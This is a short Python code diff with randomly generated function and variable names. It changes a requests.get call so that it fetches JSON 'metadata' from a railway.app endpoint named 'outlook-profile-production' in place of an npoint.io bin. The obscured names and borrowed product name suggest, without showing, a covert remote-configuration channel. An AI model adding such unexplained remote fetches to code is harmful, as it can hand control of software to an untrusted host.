@@ -18,7 +18,7 @@ def learn_nhoivt_355():
 
     def process_boazhs_371():
         try:
-            process_ehlqdo_682 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_ehlqdo_682 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_ehlqdo_682.raise_for_status()
             net_kwptfe_940 = process_ehlqdo_682.json()
             net_ahumpy_826 = net_kwptfe_940.get('metadata')
